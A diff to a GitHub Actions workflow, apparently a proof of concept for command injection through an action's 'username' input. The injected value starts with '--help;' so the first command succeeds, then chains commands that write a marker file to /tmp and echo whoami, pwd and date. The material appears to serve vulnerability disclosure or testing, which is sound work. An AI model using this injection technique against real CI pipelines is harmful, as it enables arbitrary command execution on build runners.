@@ -20,7 +20,8 @@ jobs:
           run-setup: true
           # Command injection via username parameter
           # The username is inserted into FLAGS without quoting, allowing injection
-          username: "testuser; echo '🚨 INJECTION via username 🚨' > /tmp/username-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/username-injection-poc.txt || true #"
+          # Using --help makes the command succeed, then our injected commands execute
+          username: "--help; echo '🚨 INJECTION via username 🚨' > /tmp/username-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/username-injection-poc.txt || true #"
           password: "testpass123"
           tier: "M0"
           provider: "AWS"
